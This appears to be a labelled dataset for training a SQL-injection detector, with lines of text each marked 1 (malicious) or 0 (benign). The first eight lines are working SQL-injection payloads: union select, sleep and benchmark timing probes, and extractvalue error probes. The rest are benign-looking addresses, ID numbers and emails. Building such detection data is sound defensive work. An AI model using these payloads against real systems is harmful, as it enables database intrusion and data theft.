"-8609%""   )    )     )   union all select 602160216021602160216021--",1
select benchmark  (  5000000md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp,1
"1%"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and ""%""  =  """,1
"1""  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1domain.columns as t2domain.tables as t3  )   and   (  ""fpqh""  =  ""fpqh",1
1   )    )    as rwsn where 9946  =  9946 or extractvalue  (  1297concat  (  0x5c0x7171706a71  (  select   (  elt  (  1297  =  12971   )    )     )  0x717a767a71   )    )   --,1
1'+  (  select wjpc where 5943  =  5943 and make_set  (  8403  =  84038899   )    )   +',1
1%'   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  null  )  0  )  500000000  )  null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   '%'  =  ',1
-9456%'   )    )     )   order by 1#,1
99745017c,0
ejerci78,0
47209,0
calle valencia de don juan 161 7?d,0
b3r3al,0
46942381w,0
elder@parcalia.hn,0
24596413y,0
compte,0
2366,0
leshowit,0
lehar,0
45699398p,0
calle profesor angel lacalle s/n,0
tardn,0
"3,54937E+15",0
14100,0
rigby,0
caada del hoyo,0
45641,0
englert,0
threader,0
elias pallares,0
f1581il2ente,0
57317186j,0
bocana$da,0
escarpelo,0
43785,0
"3,40E+19",0
lu,0
calle limones 60,0
hana,0
dillard,0
casas de miravete,0
olea de boedo,0
empuar,0
0o380ado6,0
montroy,0
99997973e,0
8364039999999999,0
grupo fuensanta 197 12?a,0
jalance,0
420136000000000,0
c/ ricardo gutierrez 26 8-d,0
ivancevi,0
castil de vela,0
genaro,0
ergasto,0
llosa de ranes la,0
es2eri5o,0
cuenca,0
02054707w,0
21184515c,0
"5,71439E+15",0
41110,0
marcano giner,0
lemoine5@informatica2009.zr,0
pr3caz,0
37130,0
marsh@comerciosaspe.ke,0
inescourt7@citycvs.mil,0
c/ julia minguillon 179 7-a,0
obsequ.iosa,0
calle carlos amel 32 12?h,0
kallewar,0
59760678p,0
5240,0
toperzer1,0
canaan,0
suzuki,0
antigua de ancora s/n,0
calle dean miranda 106 6-f,0
10380,0
madgett,0
gerola pugliesi,0
36574,0
c/ comedias 109,0
"8,61689E+15",0
tanchak,0
don quijote 81,0
ceferina,0
saturnino,0
israel_piggot@joyclub.pe,0
5n37do,0
lanfranchi@getgold.tl,0
micaas,0
herrmann@codwatw.edu,0
9.48E+015,0
"5,83899E+15",0
ajoy,0
irissou,0
quisto,0
s5bal850de,0
balsam-prey@mmo.com.cat,0
lurlene,0
c/ elvas 112 13-a,0
de canoves 13,0
hembrick,0
"1,76E+20",0
darcy@google-movil.dz,0
katia,0
